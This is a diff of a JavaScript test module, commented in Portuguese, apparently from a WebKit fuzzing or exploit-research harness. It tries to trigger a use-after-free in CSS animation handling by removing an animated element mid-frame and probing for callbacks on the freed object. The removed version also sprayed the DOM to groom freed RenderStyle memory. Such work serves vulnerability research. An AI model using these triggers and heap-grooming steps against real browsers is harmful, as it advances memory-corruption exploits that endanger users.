@@ -1,76 +1,129 @@
-import { Groomer } from '../mod_groomer.js';
+/**
+ * SC_CSS_ANIM_REMOVED.JS
+ * Categoria : DOM/STYLE — Use-After-Free
+ * Alvo      : WebCore::AnimationTimeline / CSSAnimation lifecycle
+ * Técnica   : Inicia uma animação CSS num elemento, remove o elemento
+ *             do DOM durante o primeiro frame, e observa se callbacks
+ *             de animação ainda disparam sobre o objeto C++ liberado.
+ *             O AnimationTimeline pode manter uma referência "stale"
+ *             ao elemento mesmo após remoção.
+ * Referência: Similar ao CVE-2020-9802 (WebKit animation UAF)
+ */
 
 export default {
-    id:       'CSS_ANIMATION_REMOVED_ELEMENT',
-    category: 'DOM',
-    risk:     'HIGH',
-    description:
-        'UAF via Web Animations API. Inicia uma animação complexa de Transform e ' +
-        'destrói o elemento dentro de um requestAnimationFrame (rAF). A tentativa de ' +
-        'ler o getComputedTiming() da animação morta acede ao RenderStyle C++ libertado.',
+    id:          'CSS_ANIM_REMOVED',
+    category:    'DOM/STYLE',
+    risk:        'HIGH',
+    description: 'AnimationTimeline mantém ref para elemento já removido. '
+                + 'Dispara callbacks de animação pós-free para detectar UAF no C++.',
 
-    setup: function() {
-        this.results = {};
-        this.sandbox = document.getElementById('groomer-sandbox');
-        
-        this.target = document.createElement('div');
-        this.target.style.width = "100px";
-        this.sandbox.appendChild(this.target);
-        
-        void this.target.offsetWidth; // Força layout nativo
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _el:             null,
+    _container:      null,
+    _styleTag:       null,
+    _callbackCount:  0,
+    _callbackPhase:  null,
+    _animObj:        null,
 
-        // Criamos uma animação infinita gerida pelo C++
-        this.anim = this.target.animate(
-            [{ transform: 'translateX(0px)' }, { transform: 'translateX(1000px)' }], 
-            { duration: 1000, iterations: Infinity }
-        );
+    supported: function() {
+        return typeof document !== 'undefined'
+            && typeof CSSAnimation !== 'undefined';
     },
 
-    trigger: async function() {
-        const self = this;
-        return new Promise(resolve => {
-            // Sincronizamos a destruição com o "Tick" de desenho da tela (60Hz)
-            requestAnimationFrame(() => {
-                try {
-                    // O GATILHO: Arranca o alvo do DOM a meio do cálculo de matrizes
-                    self.target.remove();
-                    
-                    // Inundação imediata para tentar sobrepor o RenderStyle
-                    let trash = Groomer.sprayDOM('div', 200);
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._callbackCount = 0;
+        this._callbackPhase = null;
 
-                    // A BOMBA: Lemos o estado calculado da animação.
-                    // O C++ tem de ir ao Elemento/RenderStyle morto para devolver a resposta!
-                    self.results.timing = self.anim.effect.getComputedTiming().progress;
-                } catch(e) {
-                    self.results.error = e.message;
-                }
-                resolve();
-            });
-        });
-    },
-
-    probe: [
-        s => s.results.error || 'rAF Executado',
-        
-        // Probe de STALE DATA
-        s => {
-            let prog = s.results.timing;
-            if (typeof prog === 'number') {
-                // O progresso deve ser um float entre 0.0 e 1.0. 
-                // Se for um número absurdo, o C++ leu ponteiros em vez do tempo de animação!
-                if (prog < 0 || prog > 100) {
-                    return prog; // Dispara STALE DATA no HUD
-                }
+        // Injeta keyframes via <style>
+        this._styleTag = document.createElement('style');
+        this._styleTag.textContent = `
+            @keyframes uaf-anim {
+                0%   { transform: translateX(0px);   opacity: 1; }
+                50%  { transform: translateX(100px); opacity: 0.5; }
+                100% { transform: translateX(200px); opacity: 0; }
             }
-            return 0; // Seguro
-        }
+            .uaf-target {
+                animation: uaf-anim 0.1s linear 3;
+                width: 10px; height: 10px;
+                position: absolute; left: -9999px;
+            }
+        `;
+        document.head.appendChild(this._styleTag);
+
+        this._container = document.createElement('div');
+        document.body.appendChild(this._container);
+
+        this._el = document.createElement('div');
+        this._el.className = 'uaf-target';
+
+        // Registra handlers ANTES de adicionar ao DOM
+        this._el.addEventListener('animationstart', (e) => {
+            this._callbackCount++;
+            this._callbackPhase = 'start';
+            this._animObj = e.target.getAnimations?.()[0] ?? null;
+        });
+        this._el.addEventListener('animationiteration', () => {
+            this._callbackCount++;
+            this._callbackPhase = 'iteration';
+        });
+        this._el.addEventListener('animationend', () => {
+            this._callbackCount++;
+            this._callbackPhase = 'end';
+        });
+
+        this._container.appendChild(this._el);
+
+        // Aguarda o primeiro frame para a animação começar
+        await new Promise(r => requestAnimationFrame(r));
+        await new Promise(r => requestAnimationFrame(r));
+    },
+
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // Remove o elemento do DOM enquanto a animação está ativa
+        this._el.remove();
+
+        // Força layout para que o motor processo o estilo
+        void document.body.offsetWidth;
+
+        // Aguarda possível disparo de callbacks sobre o objeto liberado
+        await new Promise(r => setTimeout(r, 50));
+        await new Promise(r => requestAnimationFrame(r));
+    },
+
+    /* ── probes ──────────────────────────────────────────────────────── */
+    probe: [
+        // [0-3] estado do elemento após remoção
+        s => s._el.isConnected,
+        s => s._el.parentNode,
+        s => s._el.style.animationPlayState,
+        s => s._el.getAnimations?.().length ?? 0,
+
+        // [4-6] callbacks — se callbackCount subiu após remoção = UAF
+        s => s._callbackCount,
+        s => s._callbackPhase,
+        s => typeof s._callbackPhase,
+
+        // [7-9] objeto de animação obtido no callback
+        s => s._animObj?.playState ?? 'null',
+        s => s._animObj?.effect?.target === s._el,
+        s => typeof s._animObj,
+
+        // [10-11] integridade do container
+        s => s._container.isConnected,
+        s => s._container.children.length,
     ],
 
-    cleanup: function() {
-        try { this.anim.cancel(); } catch(e){}
-        try { this.target.remove(); } catch(e){}
-        this.target = null;
-        this.anim = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        this._container?.remove();
+        this._styleTag?.remove();
+        this._container    = null;
+        this._el           = null;
+        this._styleTag     = null;
+        this._animObj      = null;
+        this._callbackCount = 0;
+        this._callbackPhase = null;
     }
 };
